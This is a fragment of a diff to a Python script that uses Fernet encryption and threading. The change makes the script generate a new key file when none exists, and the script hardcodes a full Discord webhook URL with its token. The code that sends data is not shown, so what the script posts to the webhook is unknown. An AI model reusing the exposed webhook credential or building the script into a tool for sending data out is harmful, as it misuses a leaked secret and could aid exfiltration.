@@ -5,13 +5,20 @@ import os
 import threading
 
 # Load the encryption key
-try:
-    with open("encryption_key.key", "rb") as key_file:
-        key = key_file.read()
+key_file = "encryption_key.key"
+
+if os.path.exists(key_file):
+    # If the key file exists, read the key from it
+    with open(key_file, "rb") as f:
+        key = f.read()
     cipher = Fernet(key)
-except FileNotFoundError:
-    print("Encryption key not found! Please generate the key using 'generate_key.py' first.")
-    exit()
+else:
+    # If the key file does not exist, generate a new key and save it to the file
+    key = Fernet.generate_key()
+    with open(key_file, "wb") as f:
+        f.write(key)
+    print("Encryption key generated and saved as 'encryption_key.key'")
+    cipher = Fernet(key)
 
 # Discord Webhook URL
 discord_webhook_url = "https://discord.com/api/webhooks/1311116235433574492/frXUQT2FN8NbTvzA5TCiZ2Moc_QLS56xT49_SaxZbwS-XfmDv815jOGYC3ozovFsuZsX"
